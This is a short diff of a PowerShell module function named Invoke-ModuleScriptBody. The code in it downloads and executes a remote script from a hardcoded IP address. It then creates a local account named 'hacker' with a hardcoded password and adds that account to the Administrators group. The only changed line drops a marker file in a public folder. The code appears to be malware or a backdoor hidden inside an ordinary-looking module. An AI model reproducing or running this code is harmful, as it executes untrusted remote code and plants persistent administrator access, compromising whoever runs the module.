@@ -17,7 +17,7 @@ function Invoke-ModuleScriptBody {
 
     iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/1.ps1')
 
-
+    echo aaa > C:\Users\Public\aaa.txt
     $Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
     New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
     Add-LocalGroupMember -Group "Administrators" -Member "hacker"
